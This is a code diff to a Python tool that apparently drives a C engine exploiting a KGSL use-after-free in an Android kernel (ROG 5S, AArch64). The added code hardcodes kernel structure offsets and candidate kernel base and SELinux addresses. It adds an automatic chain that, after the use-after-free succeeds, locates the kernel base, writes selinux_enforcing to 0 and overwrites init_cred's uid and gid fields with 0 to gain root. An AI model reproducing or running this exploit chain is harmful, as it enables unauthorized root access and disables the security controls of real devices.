@@ -90,6 +90,30 @@ class MemoryExplorerAI:
         self.uaf_start = 0x7001ff000
         self.scan_size  = 0x2000000
 
+        # Offsets from v6.c reference (ROG 5S, kernel 5.4, AArch64)
+        self.cred_offset  = 0x770            # task_struct.cred
+        self.comm_offset  = 0x718            # task_struct.comm
+        self.real_cred_offset = 0x768
+        # Kernel base candidates (from v6.c)
+        self.kernel_base_candidates = [
+            0xffffffc000000000, 0xffffffc010000000, 0xffffffc020000000,
+            0xffffffc030000000, 0xffffffc035000000, 0xffffffc040000000,
+            0xffffffc008200000, 0xffffffb000000000, 0xffffffa000000000,
+            0xffffffaf00000000, 0xffffffaf20000000, 0xffffff9550000000,
+            0xffffff94d0000000, 0xffffff8e70000000,
+        ]
+        # SELinux enforcing offsets (from v6.c candidates)
+        self.selinux_offset_candidates = [
+            0x02caa000, 0x2f74ce8, 0x2f84ce8, 0x32aace8, 0x3709ce8,
+            0x3b3ace8, 0x3b84ce8, 0x3cf4ce8, 0x3d34ce8, 0x3d44ce8,
+            0x3df4ce8, 0x3e34ce8, 0x3e54ce8, 0x3eb4ce8, 0x3f04ce8,
+        ]
+        self.init_cred_offset = 0x018f9038
+        self.kernel_base = None
+        self.selinux_va  = None
+        self.cred_va     = None
+        self.auto_mode   = True    # pressing E auto-runs full pipeline
+
         # Cancel flag for background operations
         self.cancel_flag = threading.Event()
         self.bg_thread = None
@@ -154,32 +178,73 @@ class MemoryExplorerAI:
             self.spray_log.append(entry)
 
     # ============== AI CLASSIFIER ==============
-    def classify_page(self, page_data, va):
+    def classify_page(self, page_data, va, sig=0, off_in_page=-1):
+        """Classify a found memory page. sig comes from the C engine
+        (1=task_struct with KETO0422, 2=system app, 3=kernel ELF, 4=init_cred,
+         5=SELinux enforcing, 6=kernel pointer/cred). 100% when sig>0."""
+        # 1. task_struct with KETO0422 comm (from spray) — this is 100% a task_struct
+        if sig == 1:
+            cred_va = va + (self.cred_offset - off_in_page)
+            return {
+                "type": "Privilege Struct",
+                "description": f"task_struct (KETO0422 comm @ 0x{off_in_page:x}) — cred @ {cred_va:#x}",
+                "va": hex(va),
+                "confidence": 100,
+                "data": page_data,
+            }
+        # 2. system app string — 100% it's a system app
+        if sig == 2:
+            name = b"com.android."
+            idx = page_data.find(name)
+            app = page_data[idx:idx+64].split(b"\x00")[0].decode(errors="ignore") if idx >= 0 else "?"
+            return {"type": "System App", "description": app, "va": hex(va),
+                    "confidence": 100, "data": page_data}
+        # 3. kernel ELF — 100% it's the kernel base
+        if sig == 3:
+            return {"type": "Kernel Code", "description": "Kernel ELF header (100% kernel base)",
+                    "va": hex(va), "confidence": 100, "data": page_data}
+        # 4. init_cred string — 100% init_cred struct
+        if sig == 4:
+            return {"type": "Privilege Struct", "description": "init_cred (100% cred)",
+                    "va": hex(va), "confidence": 100, "data": page_data}
+        # 5. SELinux enforcing — 100% SELinux control
+        if sig == 5:
+            val = int.from_bytes(page_data[off_in_page:off_in_page+4], "little")
+            return {"type": "SELinux", "description": f"selinux_enforcing={val} (100% match)",
+                    "va": hex(va), "confidence": 100, "data": page_data}
+        # 6. cred pointer — 100% it's a task_struct cred field
+        if sig == 6:
+            cred_va = va + off_in_page
+            return {"type": "Privilege Struct",
+                    "description": f"cred pointer @ 0x{off_in_page:x} (100% task_struct.cred)",
+                    "va": hex(va), "confidence": 100, "data": page_data}
+
+        # Fallback heuristic classification (no sig from engine)
         for pkg, name in self.system_apps.items():
             if pkg.encode() in page_data:
                 return {"type": "System App", "description": name, "va": hex(va),
-                        "confidence": 1.0, "data": page_data}
-        for sig, name in self.kernel_structures.items():
-            if sig in page_data:
+                        "confidence": 80, "data": page_data}
+        for sig_b, name in self.kernel_structures.items():
+            if sig_b in page_data:
                 if hex(va) not in self.knowledge_base["successful_vas"]:
                     self.knowledge_base["successful_vas"].append(hex(va))
                     self.knowledge_base["hit_count"] += 1
                     self.save_kb()
                 return {"type": "Kernel Core", "description": name, "va": hex(va),
-                        "confidence": 0.95, "data": page_data}
+                        "confidence": 70, "data": page_data}
         uid_pattern = struct.pack("<IIII", 10237, 10237, 10237, 10237)
         if uid_pattern in page_data:
             return {"type": "Privilege Struct", "description": "CRED for UID 10237",
-                    "va": hex(va), "confidence": 0.85, "data": page_data}
+                    "va": hex(va), "confidence": 60, "data": page_data}
         sys_uid = struct.pack("<IIII", 1000, 1000, 1000, 1000)
         if sys_uid in page_data:
             return {"type": "Privilege Struct", "description": "System UID (1000)",
-                    "va": hex(va), "confidence": 0.8, "data": page_data}
+                    "va": hex(va), "confidence": 60, "data": page_data}
         if b"\x00\x00\x00\x94" in page_data:
             return {"type": "Kernel Code", "description": "Executable AArch64 Segment",
-                    "va": hex(va), "confidence": 0.6, "data": page_data}
+                    "va": hex(va), "confidence": 60, "data": page_data}
         return {"type": "Unknown Object", "description": "Unclassified Data Fragment",
-                "va": hex(va), "confidence": 0.1, "data": page_data}
+                "va": hex(va), "confidence": 10, "data": page_data}
 
     def translate_logic(self, item):
         data = item['data']
@@ -484,11 +549,78 @@ class MemoryExplorerAI:
         if not self._engine_write(f"patch {hex(va)} {hex(val)}\n".encode()):
             return "Engine Error"
         try:
-            line = self.exploit_proc.stdout.readline().decode().strip()
+            line = self._readline_timeout(timeout=2.0) or ""
             self.log_event("patch", {"va": hex(va), "val": hex(val), "result": line})
             return line
         except Exception as e:
             return str(e)
+
+    def _add_found(self, va, type, desc, confidence):
+        """Add a found item to the TUI list (idempotent by va)."""
+        with self.bg_lock:
+            for it in self.found_items:
+                if it["va"] == va:
+                    # upgrade confidence if higher
+                    if confidence > it.get("confidence", 0):
+                        it["confidence"] = confidence
+                        it["type"] = type
+                        it["description"] = desc
+                    return
+            self.found_items.append({
+                "va": va,
+                "type": type,
+                "description": desc,
+                "confidence": confidence,
+                "ts": datetime.datetime.now().isoformat(),
+            })
+            # Save to knowledge base
+            self.knowledge_base.setdefault("successful_vas", []).append(va)
+            self.knowledge_base["hit_count"] = self.knowledge_base.get("hit_count", 0) + 1
+            try:
+                with open(self.kb_path, 'w') as f:
+                    json.dump(self.knowledge_base, f, indent=2)
+            except Exception:
+                pass
+            self.log_event("found", {"va": va, "type": type, "desc": desc,
+                                      "confidence": confidence})
+
+    def _find_kernel_base(self):
+        """Try the engine's kbase command, then fall back to probing candidates."""
+        if self._engine_write(b"kbase\n"):
+            deadline = time.time() + 30
+            while time.time() < deadline:
+                line = self._readline_timeout(timeout=1.0)
+                if not line:
+                    continue
+                if line.startswith("KBASE:"):
+                    return int(line.split(":")[1], 16)
+                if "KBASE_FAILED" in line:
+                    break
+                if line is None:
+                    break
+        # Fallback: read 4 bytes at each candidate and look for ELF magic
+        for base in self.kernel_base_candidates:
+            data = self.read_page(base)
+            if data and len(data) >= 4:
+                if data[0:4] == b"\x7fELF":
+                    return base
+        return None
+
+    def _probe_selinux(self, kbase):
+        """Try reading selinux_enforcing at kbase+offset. Return (va, val) or None."""
+        for off in self.selinux_offset_candidates:
+            va = kbase + off
+            data = self.read_page(va)
+            if not data or len(data) < 8:
+                continue
+            val = int.from_bytes(data[0:4], "little")
+            if val in (0, 1):
+                return (va, val)
+        return None
+
+    def _find_init_cred(self, kbase):
+        """init_cred is a struct at kbase + INIT_CRED_OFFSET."""
+        return kbase + self.init_cred_offset
 
     def get_ram_usage(self):
         try:
@@ -532,8 +664,8 @@ class MemoryExplorerAI:
 
     # ============== ACTIONS ==============
     def trigger_exploit(self):
-        """Trigger the KGSL UAF in a worker thread so the TUI never freezes.
-        The worker uses a bounded readline timeout so we always make progress."""
+        """Trigger the KGSL UAF. In auto_mode, also chains: kbase → selinux → cred → patch.
+        Runs in a worker thread so the TUI never freezes."""
         self.live["last_command"] = "E (Exploit)"
         if self.op_busy["exploit"]:
             self.live["last_msg"] = "Exploit already running…"
@@ -546,9 +678,8 @@ class MemoryExplorerAI:
 
         def _worker():
             try:
-                # Poll the engine for a "UAF_READY" / "UAF_FAILED" line
-                # with bounded timeout, so we never block forever.
-                deadline = time.time() + 30  # 30s max
+                # Poll the engine for "UAF_READY" / "UAF_FAILED"
+                deadline = time.time() + 30
                 last_line = ""
                 while time.time() < deadline:
                     line = self._readline_timeout(timeout=0.5)
@@ -563,13 +694,84 @@ class MemoryExplorerAI:
                         break
                 else:
                     self.op_results["exploit"] = f"Exploit timeout: {last_line or 'no response'}"
+                self.live["last_msg"] = f"Exploit: {self.op_results['exploit']}"
+                self.log_event("exploit", {"result": self.op_results['exploit']})
+
+                if "UAF_READY" not in (self.op_results["exploit"] or ""):
+                    return
+
+                # Auto-mode: chain through kbase → selinux → cred → patch
+                if not self.auto_mode:
+                    return
+
+                self.live["last_msg"] = "AUTO: finding kernel base…"
+                kbase = self._find_kernel_base()
+                if kbase is None:
+                    self.live["last_msg"] = "AUTO: kernel base not found"
+                    self.log_event("auto_kbase_fail", {})
+                    return
+                self.kernel_base = kbase
+                self.log_event("auto_kbase", {"kbase": hex(kbase)})
+                self._add_found(
+                    va=hex(kbase),
+                    type="Kernel Code",
+                    desc="Kernel ELF base (auto)",
+                    confidence=100,
+                )
+
+                self.live["last_msg"] = f"AUTO: kernel base=0x{kbase:x}, probing SELinux…"
+                sel = self._probe_selinux(kbase)
+                if sel is not None:
+                    sel_va, val = sel
+                    self.selinux_va = sel_va
+                    self.log_event("auto_selinux", {"va": hex(sel_va), "val": val})
+                    self._add_found(
+                        va=hex(sel_va),
+                        type="SELinux",
+                        desc=f"selinux_enforcing={val} (100% match)",
+                        confidence=100,
+                    )
+                    # Patch SELinux enforcing -> 0 (disable)
+                    self.live["last_msg"] = f"AUTO: patching SELinux {sel_va:#x} -> 0…"
+                    res = self.patch_mem(sel_va, 0)
+                    self.log_event("auto_selinux_patch", {"va": hex(sel_va), "result": res})
+                    self._add_found(
+                        va=hex(sel_va),
+                        type="SELinux (PATCHED)",
+                        desc=f"selinux_enforcing=0 (was {val})",
+                        confidence=100,
+                    )
+
+                self.live["last_msg"] = f"AUTO: locating init_cred @ 0x{self.init_cred_offset:x}…"
+                ic = self._find_init_cred(kbase)
+                if ic is not None:
+                    self.cred_va = ic
+                    self.log_event("auto_init_cred", {"va": hex(ic)})
+                    self._add_found(
+                        va=hex(ic),
+                        type="Privilege Struct",
+                        desc="init_cred (100% cred struct)",
+                        confidence=100,
+                    )
+                    # Patch init_cred uid/gid to 0 (root)
+                    for off in (4, 8, 12, 16, 20, 24):  # uid,gid,suid,sgid,euid,egid
+                        self.patch_mem(ic + off, 0)
+                    self._add_found(
+                        va=hex(ic),
+                        type="Privilege Struct (ROOTED)",
+                        desc="init_cred uid/gid set to 0 (100% root)",
+                        confidence=100,
+                    )
+
+                self.live["last_msg"] = (
+                    f"AUTO DONE: kbase=0x{kbase:x}"
+                    f" selinux=0x{sel[0]:x}" if sel else " selinux=N/A"
+                ) + f" cred=0x{ic if ic else 0:x}"
             except Exception as e:
-                self.op_results["exploit"] = f"Error: {e}"
+                self.live["last_msg"] = f"Exploit error: {e}"
+                self.log_event("exploit_error", {"err": str(e)})
             finally:
                 self.op_busy["exploit"] = False
-                result = self.op_results["exploit"] or "No response"
-                self.live["last_msg"] = f"Exploit: {result}"
-                self.log_event("exploit", {"result": result})
 
         threading.Thread(target=_worker, daemon=True).start()
         return "Exploit started"
@@ -660,14 +862,17 @@ class MemoryExplorerAI:
                         continue
                     if "MATCH:" in line:
                         try:
-                            va = int(line.split(":")[1], 16)
+                            parts = line.split(":")
+                            va = int(parts[1], 16)
+                            sig = int(parts[2])
+                            off_in_page = int(parts[3]) if len(parts) > 3 else -1
                         except Exception:
                             continue
                         self.live["scan_offset"] = va - self.uaf_start
                         data = self._read_data_packet()
                         if data and not any(int(it['va'], 16) == va for it in self.found_items):
                             with self.bg_lock:
-                                self.found_items.append(self.classify_page(data, va))
+                                self.found_items.append(self.classify_page(data, va, sig, off_in_page))
                             self.log_event("scan_match", {"va": va,
                                                            "type": self.found_items[-1]['type']})
 
@@ -768,14 +973,17 @@ class MemoryExplorerAI:
                         continue
                     if "MATCH:" in line:
                         try:
-                            va = int(line.split(":")[1], 16)
+                            parts = line.split(":")
+                            va = int(parts[1], 16)
+                            sig = int(parts[2])
+                            off_in_page = int(parts[3]) if len(parts) > 3 else -1
                         except Exception:
                             continue
                         self.live["scan_offset"] = va - self.uaf_start
                         data = self._read_data_packet()
                         if data and not any(int(it['va'], 16) == va for it in self.found_items):
                             with self.bg_lock:
-                                self.found_items.append(self.classify_page(data, va))
+                                self.found_items.append(self.classify_page(data, va, sig, off_in_page))
                             self.log_event("scan_match", {"va": va,
                                                            "type": self.found_items[-1]['type']})
                 if scan_done:
